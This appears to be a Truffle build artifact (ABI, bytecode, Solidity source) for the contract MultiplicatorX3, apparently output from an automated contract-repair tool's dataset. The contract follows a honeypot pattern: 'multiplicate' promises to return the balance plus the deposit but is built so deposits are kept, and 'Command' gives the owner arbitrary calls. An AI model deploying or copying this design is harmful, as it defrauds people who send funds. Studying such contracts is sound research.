{
  "contractName": "MultiplicatorX3",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "Owner",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "withdraw",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "adr",
          "type": "address"
        },
        {
          "name": "data",
          "type": "bytes"
        }
      ],
      "name": "Command",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "adr",
          "type": "address"
        }
      ],
      "name": "multiplicate",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "bytecode": "0x6080604052336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555034801561005057600080fd5b50610420806100606000396000f300608060405260043610610062576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680631ac9f70d146100645780633ccfd60b1461009a578063b4a99a4e146100a4578063ba21d62a146100fb575b005b610098600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610177565b005b6100a26101fb565b005b3480156100b057600080fd5b506100b96102d7565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b610175600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001908201803590602001908080601f01602080910402602001604051908101604052809392919081815260200183838082843782019150505050505091929192905050506102fc565b005b3073ffffffffffffffffffffffffffffffffffffffff1631341015156101f8578073ffffffffffffffffffffffffffffffffffffffff166108fc343073ffffffffffffffffffffffffffffffffffffffff1631019081150290604051600060405180830381858888f193505050501580156101f6573d6000803e3d6000fd5b505b50565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561025657600080fd5b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f193505050501580156102d4573d6000803e3d6000fd5b50565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561035957600080fd5b8273ffffffffffffffffffffffffffffffffffffffff16348360405180828051906020019080838360005b8381101561039f578082015181840152602081019050610384565b50505050905090810190601f1680156103cc5780820380516001836020036101000a031916815260200191505b5091505060006040518083038185875af19250505090508015156103ef57600080fd5b5050505600a165627a7a7230582095334cfd425d70b55d17333e7aadcd779f0b29dade1ba6bdfb8cdbc15eb47e4d0029",
  "source": "pragma solidity ^0.4.18;\n\ncontract sGuardPlus {\n    constructor() internal {}\n}\n\ncontract MultiplicatorX3 {\n    address public Owner = msg.sender;\n\n    function() public payable {}\n\n    function withdraw() public payable {\n        require(msg.sender == Owner);\n        Owner.transfer(this.balance);\n    }\n\n    function Command(address adr, bytes data) public payable {\n        require(msg.sender == Owner);\n        bool __sent_result100 = adr.call.value(msg.value)(data);\n        require(__sent_result100);\n    }\n\n    function multiplicate(address adr) public payable {\n        if (msg.value >= this.balance) {\n            adr.transfer(this.balance + msg.value);\n        }\n    }\n}\n",
  "sourcePath": "/workdir/truffle_example/after/0x5aa88d2901c68fda244f1d0584400368d2c8e739/contracts/0x5aa88d2901c68fda244f1d0584400368d2c8e739.sol.fixed.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "3.4.8",
  "updatedAt": "2022-08-12T12:28:55.292Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}